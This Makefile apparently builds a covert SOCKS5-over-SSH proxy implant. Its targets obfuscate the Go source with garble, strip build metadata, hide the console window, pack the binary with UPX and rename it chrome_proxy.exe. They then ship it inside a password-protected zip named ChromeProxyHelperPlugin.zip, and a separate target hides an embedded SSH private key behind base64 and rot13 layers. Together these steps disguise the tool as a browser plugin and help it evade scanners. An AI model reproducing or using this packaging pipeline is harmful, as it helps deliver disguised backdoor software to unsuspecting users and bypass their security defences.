SOURCES=Makefile main.go main_release.go main_debug.go config.go config_release.go config_template.go system.go system_windows.go system_linux.go system_darwin.go
GARBLE_BIN = $(shell go env GOPATH)/bin/garble
GOVERSIONINFO_BIN = $(shell go env GOPATH)/bin/goversioninfo
GARBLE_CMD = $(GARBLE_BIN) -literals -tiny
export PATH := $(shell go env GOPATH)/bin:$(PATH)

all: socks5-ssh-proxy

ci: release

win: dist/socks5-ssh-proxy.exe dist/socks5-ssh-proxy.tiny.exe 
win-package: dist/ChromeProxyHelperPlugin.zip

dist:
	mkdir -p dist

socks5-ssh-proxy: $(SOURCES) 
	GOOS=linux GOARCH=amd64 go build -tags release,linux -o $@
socks5-ssh-proxy.release: resources $(SOURCES) $(GARBLE_BIN)
	GOOS=darwin GOARCH=amd64 $(GARBLE_CMD) build -tags release -o $@
	upx $@

dist/socks5-ssh-proxy.exe: dist resources $(GOVERSIONINFO_BIN) $(GARBLE_BIN) $(SOURCES)
	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go generate -tags windows,release
	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 $(GARBLE_BIN) -literals build -trimpath -ldflags "-s -w -H=windowsgui -buildid=" -tags windows,release -o $@
dist/socks5-ssh-proxy.tiny.exe: dist resources $(GOVERSIONINFO_BIN) $(GARBLE_BIN) $(SOURCES)
	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go generate -tags windows,release
	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 $(GARBLE_BIN) -literals -tiny build -trimpath -ldflags "-s -w -H=windowsgui -buildid=" -tags windows,release -o $@
goreleaser: resources $(GARBLE_BIN)
	goreleaser build --verbose --clean --snapshot --id win-release
dist/ChromeProxyHelperPlugin.zip: dist/chrome_proxy.exe
	file $<
	ls -lh $<
	zip -eP resistanceIsFutile $@ $< 
dist/chrome_proxy.exe: dist/socks5-ssh-proxy.tiny.exe
	cp -v $< $@
	upx --lzma --ultra-brute --best $@
	#go run cmd/upx-obfuscator/main.go $@

install-deps: $(GARBLE_BIN) $(GOVERSIONINFO_BIN)
$(GARBLE_BIN):
	go install mvdan.cc/garble@v0.12.1
$(GOVERSIONINFO_BIN):
	go install github.com/josephspurrier/goversioninfo/cmd/goversioninfo@v1.4.0

clean:
	rm -f *.exe
	rm -f *.zip
	rm -f socks5-ssh-proxy
	rm -f socks5-ssh-proxy.release
clean-all: clean clean-key
clean-key:
	rm -f resources/ssh*

config_release.go:
	cp config_template.go $@
	sed -i '' 's/!release/release/g' $@
config_release.go.base64: config_release.go
	base64 -i $< -o $@

resources: resources/ssh_private_key
resources/ssh_private_key:
	ssh-keygen -q -t ecdsa -b 521 -N "" -C "socks5-ssh-proxy-client@$(shell date +"%Y-%m-%d+%H:%M:%S")" -f $@
	@echo "NOTICE: Add the new key to the server"
	@echo "====================================="
	@cat $@.pub
	@echo "====================================="
resources/ssh_private_key.base64: resources/ssh_private_key
	base64 -i $< -o $@
resources/ssh_private_key.base64.rot13: resources/ssh_private_key.base64
	go run cmd/rot13-obfuscator/main.go $< $@
resources/ssh_private_key.base64.rot13.github: resources/ssh_private_key.base64.rot13
	base64 -i $< -o $@ 

vmk: resources/ssh_private_key
	shasum -a 256 $<
fmt:
	gofmt -w *.go

secrets: config_release.go.base64 resources/ssh_private_key.base64.rot13.github

.phony: clean test win
